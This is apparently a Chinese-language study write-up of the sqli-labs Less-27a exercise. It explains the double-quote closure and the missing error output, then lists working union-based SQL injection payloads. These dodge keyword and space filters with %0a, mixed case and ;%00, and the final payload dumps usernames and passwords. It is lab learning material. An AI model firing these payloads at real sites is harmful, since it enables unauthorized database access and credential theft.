# Less-27a （双引号变体+无报错）

## 查看分析源码

过滤函数和 Less-27 一模一样，区别就两处：

```php
$id = '"' .$id. '"';            // 双引号包裹
```

```php
// print_r(mysql_error());      // 没有报错回显
```

SQL 变成 `id="$id"`，闭合全换成双引号。无报错但数据正常时会显示。

和 27 一样用 `%0a` 替空格、混合大小写替 select/union、`;%00` 截断。

## 回显位

```
?id=0"%0auNIon%0aSelECt%0a1,2,3;%00
```
![](99_Attachments/图片/Less-27a/file-20260615201412508.png)
## 爆数据

子查询放一列，`:` 分割：

```
?id=0"%0auNIon%0aSelECt%0a1,2,(selECt%0agroup_concat(username,':',password)%0afrom%0ausers);%00
```

![](99_Attachments/图片/Less-27a/file-20260615201441300.png)
